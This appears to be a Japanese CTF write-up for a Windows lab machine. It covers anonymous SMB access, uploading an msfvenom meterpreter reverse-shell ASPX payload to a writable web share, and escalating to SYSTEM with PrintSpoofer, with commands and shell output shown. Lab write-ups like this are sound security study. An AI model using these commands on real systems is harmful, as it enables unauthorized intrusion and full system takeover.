---
title: "Rerevand"
date: 2024-03-18T09:58:44+09:00
draft: false
---

### user

- smb が開いてるのでこれを起点にする
  - enum4linux は動かなかった
  - nmap よく見たら windows だった
  - ```smbclient -L \\\\ip``` で使えそうな share を探す
  - ```nt4wrksv``` が使えそう
  - パスワードなしで入れる
  - パスワードリストが手に入る
- ```nt4wrksv``` が書き込み可能なのでリバースシェルを入れる([SMB (Server Message Block) Pentesting - Exploit Notes](https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/#upload-files))
  - ```msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=ip lport=port -f aspx -o shell.asp```
  - ```smb: \> put shell.aspx```
  - ```curl http://10.10.16.163:49663/nt4wrksv/shell.aspx```

### root

- SeImpersonatePrivilege が使える([Abusing Tokens - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens))
- ```wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe``` を使う

```shell
eterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

``` shell
meterpreter > shell

C:\users\bob\desktop>cd c:/inetpub/wwwroot/nt4wrksv
cd c:/inetpub/wwwroot/nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

03/17/2024  05:50 PM    <DIR>          .
03/17/2024  05:50 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
03/17/2024  05:50 PM            27,136 PrintSpoofer64.exe
03/17/2024  05:45 PM         1,020,190 shell.aspx
               3 File(s)      1,047,424 bytes
               2 Dir(s)  20,277,039,104 bytes free

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell.exe
PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system

PS C:\Windows\system32> cd /users/administrator/desktop
cd /users/administrator/desktop

PS C:\users\administrator\desktop> dir
dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        7/25/2020   8:25 AM             35 root.txt  
```
